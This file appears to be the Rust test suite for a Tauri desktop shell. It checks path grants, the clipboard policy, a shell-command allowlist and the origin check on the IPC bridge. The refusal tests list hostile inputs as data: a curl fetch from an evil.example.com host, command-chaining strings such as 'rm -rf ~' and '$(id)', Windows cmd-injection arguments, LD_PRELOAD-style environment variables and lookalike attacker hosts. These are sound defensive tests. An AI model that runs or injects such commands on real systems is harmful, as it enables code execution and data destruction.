            "/etc/hosts".to_string(),
        ] {
            assert!(
                resolve_with_grants(&path, &roots, &UserGrants::default()).is_err(),
                "{path} must be refused without a root or a grant"
            );
        }
    }

    #[test]
    fn reading_the_clipboard_is_off() {
        let err = authorize_clipboard_read(&minimal().clipboard)
            .expect_err("a config that does not enable clipboard reads must refuse them");
        assert!(err.contains("clipboard"), "unexpected error: {err}");
    }

    #[test]
    fn only_the_configured_origin_is_admitted() {
        assert_eq!(
            origin_pattern(&minimal().server_url).as_deref(),
            Some("https://app.example.com/*")
        );
    }
}

#[cfg(test)]
mod shell_policy_tests {
    use super::*;

    fn allowing(commands: &[&str], env: &[&str]) -> ShellConfig {
        ShellConfig {
            enabled: true,
            allowed_commands: commands.iter().map(|c| c.to_string()).collect(),
            allowed_env: env.iter().map(|c| c.to_string()).collect(),
        }
    }

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|a| a.to_string()).collect()
    }

    #[test]
    fn enabling_without_an_allowlist_still_runs_nothing() {
        let err = authorize_shell_command(&allowing(&[], &[]), "echo", &[]).unwrap_err();
        assert!(err.contains("no allowed_commands"), "unexpected error: {err}");
    }

    #[test]
    fn a_listed_command_runs_with_its_arguments() {
        let config = allowing(&["git status", "echo"], &[]);
        assert!(authorize_shell_command(&config, "git", &args(&["status", "--short"])).is_ok());
        assert!(authorize_shell_command(&config, "echo", &args(&["hello"])).is_ok());
    }

    #[test]
    fn an_unlisted_command_is_refused() {
        let config = allowing(&["git status"], &[]);
        for (command, arguments) in [
            ("git", args(&["push", "--force"])),
            ("curl", args(&["https://evil.example.com/x.sh"])),
            ("gitk", args(&[])),
        ] {
            let err = authorize_shell_command(&config, command, &arguments).unwrap_err();
            assert!(err.contains("not in the shell allowlist"), "{command}: {err}");
        }
    }

    #[test]
    fn the_command_cannot_be_chained_into_another() {
        let config = allowing(&["echo"], &[]);
        for command in ["echo hi; rm -rf ~", "echo $(id)", "echo `id`", "echo hi | sh"] {
            let err = authorize_shell_command(&config, command, &[]).unwrap_err();
            assert!(err.contains("metacharacter"), "{command}: {err}");
        }
    }

    #[test]
    fn quoted_arguments_may_hold_anything_on_unix() {
        // Each argument is single-quoted before it reaches the shell, so these
        // are text, not syntax.
        let config = allowing(&["echo"], &[]);
        let arguments = args(&["a; b $(c) `d`"]);
        assert!(authorize_shell_command_for(&config, "echo", &arguments, false).is_ok());
    }

    #[test]
    fn arguments_that_escape_cmd_quoting_are_refused_on_windows() {
        let config = allowing(&["echo"], &[]);
        for arg in ["\"&calc&\"", "%COMSPEC%", "!x!", "a^&b", "line\r\nnext"] {
            let err = authorize_shell_command_for(&config, "echo", &args(&[arg]), true).unwrap_err();
            assert!(err.contains("through cmd"), "{arg:?}: {err}");
        }
        let plain = args(&["C:\\Users\\dev", "a b"]);
        assert!(authorize_shell_command_for(&config, "echo", &plain, true).is_ok());
    }

    #[test]
    fn only_listed_environment_variables_may_be_set() {
        let config = allowing(&["echo"], &["GREETING"]);
        assert!(authorize_shell_env(&config, ["GREETING"]).is_ok());

        for name in ["PATH", "BASH_ENV", "ENV", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES"] {
            let err = authorize_shell_env(&config, [name]).unwrap_err();
            assert!(err.contains("allowed_env"), "{name}: {err}");
        }
    }
}

/// The origin check, driven through Tauri's own IPC path on the mock runtime.
///
/// Every request here carries the URL of the frame that sent it, which is what
/// the ACL judges, and lands in a command that runs the same
/// [`ensure_trusted_caller`] the real commands run against the page the webview
/// is showing. The context is the app's real one, so the permissions granted at
/// runtime are the ones build.rs generates.
#[cfg(test)]
mod origin_tests {
    use super::*;
    use tauri::test::MockRuntime;
    use tauri::Manager;

    /// Stands in for the real command, which needs the Wry runtime to run.
    /// Same name, so the permission Tauri checks is the real one.
    #[tauri::command]
    fn handle_bridge_message<R: tauri::Runtime>(
        app: tauri::AppHandle<R>,
        webview: tauri::Webview<R>,
    ) -> Result<&'static str, String> {
        ensure_trusted_caller(&app, &webview)?;
        Ok("reached the bridge")
    }

    struct Shell {
        app: tauri::App<MockRuntime>,
        window: tauri::WebviewWindow<MockRuntime>,
    }

    /// A shell configured with `server_url`, its main window showing `showing`.
    fn shell(server_url: &str, showing: &str) -> Shell {
        let app = tauri::test::mock_builder()
            .manage(AdmittedOrigins::default())
            .manage(crate::server::ServerAddress::default())
            .invoke_handler(tauri::generate_handler![handle_bridge_message])
            .build(tauri::generate_context!("tauri.conf.json", test = true))
            .expect("the mock shell should build");
        app.manage(
            crate::window::parse_config(&format!(r#"{{"server_url":"{server_url}"}}"#))
                .expect("a minimal config"),
        );
        admit_origin(&app, server_url).expect("the configured origin should be admitted");

        let window = tauri::WebviewWindowBuilder::new(
            &app,
            "main",
            tauri::WebviewUrl::External(showing.parse().unwrap()),
        )
        .build()
        .expect("the mock shell should have a main window");
        Shell { app, window }
    }

    /// Call the bridge the way a frame at `frame_url` would.
    fn call_from(shell: &Shell, frame_url: &str) -> Result<String, String> {
        tauri::test::get_ipc_response(
            &shell.window,
            tauri::webview::InvokeRequest {
                cmd: "handle_bridge_message".into(),
                callback: tauri::ipc::CallbackFn(0),
                error: tauri::ipc::CallbackFn(1),
                url: frame_url.parse().unwrap(),
                body: tauri::ipc::InvokeBody::default(),
                headers: Default::default(),
                invoke_key: tauri::test::INVOKE_KEY.to_string(),
            },
        )
        .map(|body| body.deserialize::<String>().unwrap())
        .map_err(|error| error.to_string())
    }

    const APP: &str = "https://app.example.com";

    #[test]
    fn the_app_origin_reaches_the_bridge() {
        let shell = shell(APP, "https://app.example.com/assistant");
        assert_eq!(
            call_from(&shell, "https://app.example.com/assistant").as_deref(),
            Ok("reached the bridge")
        );
    }

    #[test]
    fn another_origin_is_refused() {
        let shell = shell(APP, "https://evil.example.com/");
        let refusal = call_from(&shell, "https://evil.example.com/").unwrap_err();
        assert!(refusal.contains("not allowed"), "unexpected refusal: {refusal}");
    }

    #[test]
    fn a_page_the_window_navigated_to_is_refused() {
        // A host listed in navigation.internal_hosts loads in the window (an
        // identity provider, say). It renders there; it does not inherit the
        // app's bridge.
        let shell = shell(APP, "https://app.example.com/");
        shell
            .window
            .navigate("https://accounts.example.org/login".parse().unwrap())
            .unwrap();

        let refusal = call_from(&shell, "https://accounts.example.org/login").unwrap_err();
        assert!(refusal.contains("not allowed"), "unexpected refusal: {refusal}");
    }

    #[test]
    fn a_request_sent_just_before_navigating_away_is_refused() {
        // The frame was the app when it sent the request, so the ACL admits it,
        // but the window shows another site by the time the command runs.
        let shell = shell(APP, "https://app.example.com/");
        shell
            .window
            .navigate("https://evil.example.com/".parse().unwrap())
            .unwrap();

        let refusal = call_from(&shell, "https://app.example.com/").unwrap_err();
        assert!(refusal.contains("Refused"), "unexpected refusal: {refusal}");
    }

    #[test]
    fn a_frame_of_another_origin_inside_the_app_is_refused() {
        // The window shows the app; the request comes from an iframe in it.
        // Judging by the window's URL alone would have let it through.
        let shell = shell(APP, "https://app.example.com/dashboard");
        let refusal = call_from(&shell, "https://ads.example.net/frame").unwrap_err();
        assert!(refusal.contains("not allowed"), "unexpected refusal: {refusal}");
    }

    #[test]
    fn an_http_downgrade_of_an_https_app_is_refused() {
        let shell = shell(APP, "http://app.example.com/");
        let refusal = call_from(&shell, "http://app.example.com/").unwrap_err();
        assert!(refusal.contains("not allowed"), "unexpected refusal: {refusal}");
    }

    #[test]
    fn lookalike_hosts_are_refused() {
        for lookalike in [
            "https://app.example.com.evil.com/",
            "https://app-example.com/",
            "https://evilapp.example.com/",
            "https://app.example.co/",
            "https://app.example.com:8443/",
            "https://app.example.com@evil.com/",
            // A Cyrillic "а" in place of the Latin one: a different host once
            // encoded, however alike the two look.
            "https://\u{0430}pp.example.com/",
        ] {
            let shell = shell(APP, lookalike);
            assert!(call_from(&shell, lookalike).is_err(), "{lookalike} reached the bridge");
        }
    }

    #[test]
    fn a_bundled_app_trusts_the_port_its_server_announced_and_no_other() {
        let shell = shell("http://127.0.0.1:0", "http://127.0.0.1:61234/");
        assert!(
            call_from(&shell, "http://127.0.0.1:61234/").is_err(),
            "nothing on loopback is trusted before the server announces itself"
        );

        shell
            .app
            .state::<crate::server::ServerAddress>()
            .set("http://127.0.0.1:61234".into());
        admit_origin(&shell.app, "http://127.0.0.1:61234").unwrap();

        assert_eq!(
            call_from(&shell, "http://127.0.0.1:61234/").as_deref(),
            Ok("reached the bridge")
        );
        assert!(call_from(&shell, "http://127.0.0.1:61235/").is_err());
    }

    #[test]
    fn admitting_the_same_origin_twice_is_harmless() {
        let shell = shell(APP, "https://app.example.com/");
        admit_origin(&shell.app, "https://app.example.com/").unwrap();
        admit_origin(&shell.app, "https://app.example.com:443").unwrap();
        assert!(call_from(&shell, "https://app.example.com/").is_ok());
    }

    #[test]
    fn a_server_url_that_is_not_a_web_origin_admits_nothing() {
        assert_eq!(origin_pattern("file:///etc/passwd"), None);
        assert_eq!(origin_pattern("not a url"), None);
        assert_eq!(origin_pattern("javascript:alert(1)"), None);
    }

    #[test]
    fn the_pattern_is_the_exact_origin() {
        assert_eq!(
            origin_pattern("https://app.example.com:443/a/b?c").as_deref(),
            Some("https://app.example.com/*")
        );
        assert_eq!(
            origin_pattern("http://127.0.0.1:3000").as_deref(),
            Some("http://127.0.0.1:3000/*")
        );
    }

    #[test]
    fn external_links_open_in_the_browser() {
        let destination = |link: &str| destination_for(APP, &[], &Url::parse(link).unwrap());

        for link in [
            "https://evil.example.com/",
            "http://app.example.com/",
            "https://app.example.com.evil.com/",
            "https://app.example.com@evil.com/",
            "https://app.example.com:8443/",
        ] {
            assert_eq!(destination(link), LinkDestination::SystemBrowser, "{link}");
        }
        assert_eq!(destination("https://app.example.com/chat"), LinkDestination::App);
    }
}
